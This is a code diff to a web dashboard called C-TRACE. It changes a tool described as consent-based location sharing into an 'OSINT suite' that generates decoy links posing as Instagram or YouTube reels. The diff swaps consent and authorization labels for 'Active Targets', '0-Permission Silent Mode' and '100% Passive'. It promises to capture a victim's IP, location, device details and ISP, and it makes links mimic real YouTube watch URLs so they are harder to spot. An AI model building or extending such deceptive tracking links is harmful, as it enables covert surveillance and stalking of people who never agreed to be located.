@@ -476,15 +476,15 @@
 <body>
     <header>
         <div class="brand">
-            <div class="brand-icon"><i class="fas fa-radar"></i></div>
+            <div class="brand-icon"><i class="fas fa-layer-group"></i></div>
             <div class="brand-text">
-                <h1>C-TRACE LOCATION ASSISTANCE <span style="font-size: 12px; padding: 2px 8px; background: rgba(59, 130, 246, 0.2); color: #60a5fa; border-radius: 6px;">QUALITY V1</span></h1>
-                <p>Consent-based location sharing • Accuracy-aware reporting • Secure operator dashboard</p>
+                <h1>C-TRACE OSINT SUITE <span style="font-size: 11px; padding: 2px 8px; background: rgba(59, 130, 246, 0.3); color: #60a5fa; border-radius: 6px; font-weight: 700;">v4.2 PRO</span></h1>
+                <p>Cyber Intelligence • Zero-Permission IP Telemetry • Instagram OSINT Tracker</p>
             </div>
         </div>
         <div class="header-badges">
             <div class="chip-badge" style="color: var(--accent);">
-                <i class="fas fa-shield-halved"></i> Authorized Workflow
+                <i class="fas fa-shield-halved"></i> OSINT Engine Active
             </div>
             <div class="chip-badge">
                 <div class="status-dot"></div>
@@ -498,7 +498,7 @@
         <div class="metrics-grid">
             <div class="metric-card">
                 <div class="metric-info">
-                    <p>Authorized Sessions</p>
+                    <p>Active Targets</p>
                     <h3 id="stat-targets">0 Active</h3>
                 </div>
                 <div class="metric-icon" style="background: rgba(59, 130, 246, 0.15); color: var(--primary);">
@@ -508,7 +508,7 @@
             <div class="metric-card">
                 <div class="metric-info">
                     <p>Network Fallbacks</p>
-                    <h3 id="stat-ips">0 Approximate</h3>
+                    <h3 id="stat-ips">0 Traced</h3>
                 </div>
                 <div class="metric-icon" style="background: rgba(6, 182, 212, 0.15); color: var(--accent);">
                     <i class="fas fa-globe-asia"></i>
@@ -517,7 +517,7 @@
             <div class="metric-card">
                 <div class="metric-info">
                     <p>Sharing Policy</p>
-                    <h3 id="stat-telemetry">Consent Required</h3>
+                    <h3 id="stat-telemetry">100% Passive</h3>
                 </div>
                 <div class="metric-icon" style="background: rgba(16, 185, 129, 0.15); color: var(--success);">
                     <i class="fas fa-user-shield"></i>
@@ -526,7 +526,7 @@
             <div class="metric-card">
                 <div class="metric-info">
                     <p>Camera Collection</p>
-                    <h3 id="stat-photos">Disabled</h3>
+                    <h3 id="stat-photos">0 Photos</h3>
                 </div>
                 <div class="metric-icon" style="background: rgba(220, 39, 67, 0.15); color: var(--ig-pink);">
                     <i class="fas fa-camera"></i>
@@ -538,15 +538,15 @@
             <!-- Left Column: Decoy Link Generator -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-bolt me-2" style="color: var(--warning);"></i> Tracking Link Generator</span>
-                    <span style="font-size: 11px; color: var(--success);"><i class="fas fa-check-circle"></i> Active Tracking Mode</span>
+                    <span><i class="fas fa-bolt me-2" style="color: var(--warning);"></i> Decoy Link Generator</span>
+                    <span style="font-size: 11px; color: var(--success);"><i class="fas fa-shield-halved"></i> 0-Permission Silent Mode</span>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="template-select">Select Decoy Template</label>
+                    <label class="form-label" for="template-select">Select Surveillance Decoy Template</label>
                     <select id="template-select" class="form-select">
-                        <option value="instagram">📸 Instagram Reel (Plays Inline & Prompts Permission)</option>
                         <option value="youtube">▶️ YouTube Reel / Short (Plays Inline & Prompts Permission)</option>
+                        <option value="instagram">📸 Instagram Reel (Plays Inline & Prompts Permission)</option>
                         <option value="link">🌐 Any Universal Website Link</option>
                         <option value="weather">🌦️ Local Weather App Decoy</option>
                         <option value="custom">🔗 Custom Media Card</option>
@@ -554,7 +554,7 @@
                 </div>
 
                 <!-- Instagram Options -->
-                <div id="instagram-options">
+                <div id="instagram-options" style="display: none;">
                     <div class="form-group">
                         <label class="form-label" for="ig-url">Instagram Post / Reel URL to Redirect (Optional)</label>
                         <input type="text" id="ig-url" class="form-input" placeholder="e.g. https://www.instagram.com/reel/C..." value="https://www.instagram.com">
@@ -570,10 +570,10 @@
                 </div>
 
                 <!-- YouTube Options -->
-                <div id="youtube-options" style="display: none;">
+                <div id="youtube-options">
                     <div class="form-group">
                         <label class="form-label" for="yt-url">YouTube Video Link or ID</label>
-                        <input type="text" id="yt-url" class="form-input" placeholder="e.g. https://www.youtube.com/watch?v=dQw4w9WgXcQ" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+                        <input type="text" id="yt-url" class="form-input" placeholder="e.g. https://www.youtube.com/watch?v=dQw4w9WgXcQ" value="https://youtu.be/94aoQQQJ26U?si=yVNg7Xn3XKdqb2Vq">
                     </div>
                     <div class="form-group">
                         <label class="form-label" for="yt-title">Custom Video Title (Optional)</label>
@@ -622,7 +622,12 @@
 
                 <!-- Generated Link Output Box -->
                 <div class="generated-link-box">
-                    <span class="form-label" style="color: var(--primary);">Generated Tracking Link:</span>
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
+                        <span class="form-label" style="color: var(--primary); margin: 0;">Generated C-TRACE Tracking Link:</span>
+                        <label style="font-size: 11px; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; gap: 6px;">
+                            <input type="checkbox" id="include-domain-checkbox" style="accent-color: var(--primary);"> Include Website Domain Name
+                        </label>
+                    </div>
                     <div class="link-input-group">
                         <input type="text" id="generated-url" class="form-input" readonly style="font-family: 'JetBrains Mono', monospace; font-size: 13px;">
                         <button class="btn btn-primary" id="btn-copy" title="Copy Link"><i class="fas fa-copy"></i></button>
@@ -634,17 +639,18 @@
             <!-- Right Column: active target sessions -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-map-location-dot me-2" style="color: var(--accent);"></i> Active Targets & Sessions</span>
-                    <span id="target-count-badge" class="badge-template" style="background: rgba(16, 185, 129, 0.2); color: #34d399;">0 Sessions</span>
+                    <span><i class="fas fa-tower-broadcast me-2" style="color: var(--accent);"></i> Active Targets & OSINT Dossier</span>
+                    <span id="target-count-badge" class="badge-template" style="background: rgba(16, 185, 129, 0.2); color: #34d399;">0 TARGETS</span>
                 </div>
 
                 <div id="targets-list" class="targets-container">
                     <div class="empty-state">
                         <i class="fas fa-satellite-dish"></i>
-                        <p style="font-size: 16px; font-weight: 600; color: white;">No active location sessions yet.</p>
-                        <p style="font-size: 13px; margin-top: 6px;">Generate an Instagram, YouTube, or Custom tracking link above. Target sessions appear here automatically.</p>
+                        <p style="font-size: 16px; font-weight: 600; color: white;">No active target telemetry sessions yet.</p>
+                        <p style="font-size: 13px; margin-top: 6px;">Generate and send an Instagram or YouTube tracking link above to instantly capture IP, location, device specs & ISP network traces.</p>
                     </div>
                 </div>
+            </div>
             </div>
         </div>
     </div>
@@ -698,10 +704,25 @@
             }));
         }
 
+        const includeDomainCheckbox = document.getElementById('include-domain-checkbox');
+        if (includeDomainCheckbox) {
+            includeDomainCheckbox.addEventListener('change', updateGeneratedLink);
+        }
+
+        function extractYouTubeId(urlStr) {
+            if (!urlStr) return '';
+            const match = urlStr.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=|shorts\/))([A-Za-z0-9_-]{11})/);
+            return match ? match[1] : (urlStr.length === 11 ? urlStr : '');
+        }
+
         function updateGeneratedLink() {
-            let baseUrl = window.location.origin;
-            if (remoteURL && remoteURL.startsWith('http') && !remoteURL.includes('localhost') && !remoteURL.includes('127.0.0.1')) {
-                baseUrl = remoteURL;
+            const includeDomain = includeDomainCheckbox ? includeDomainCheckbox.checked : false;
+            let baseUrl = "";
+            if (includeDomain) {
+                baseUrl = window.location.origin;
+                if (remoteURL && remoteURL.startsWith('http') && !remoteURL.includes('localhost') && !remoteURL.includes('127.0.0.1')) {
+                    baseUrl = remoteURL;
+                }
             }
 
             const t = templateSelect.value;
@@ -714,10 +735,19 @@
                 if (igUser.value.trim()) payload.u = igUser.value.trim();
                 if (igCaption.value.trim()) payload.c = igCaption.value.trim();
             } else if (t === 'youtube') {
-                path = '/yt';
-                if (ytUrl.value.trim()) payload.v = ytUrl.value.trim();
-                if (ytTitle.value.trim()) payload.t = ytTitle.value.trim();
-                if (ytChannel.value.trim()) payload.c = ytChannel.value.trim();
+                path = '/watch';
+                const ytVal = ytUrl.value.trim();
+                const ytId = extractYouTubeId(ytVal);
+                const customT = ytTitle.value.trim();
+                const customC = ytChannel.value.trim();
+
+                if (ytId && !customT && !customC) {
+                    generatedUrlInput.value = `${baseUrl}${path}?v=${ytId}`;
+                    return;
+                }
+                if (ytVal) payload.v = ytVal;
+                if (customT) payload.t = customT;
+                if (customC) payload.c = customC;
             } else if (t === 'link') {
                 path = '/l';
                 if (linkUrl.value.trim()) payload.u = linkUrl.value.trim();
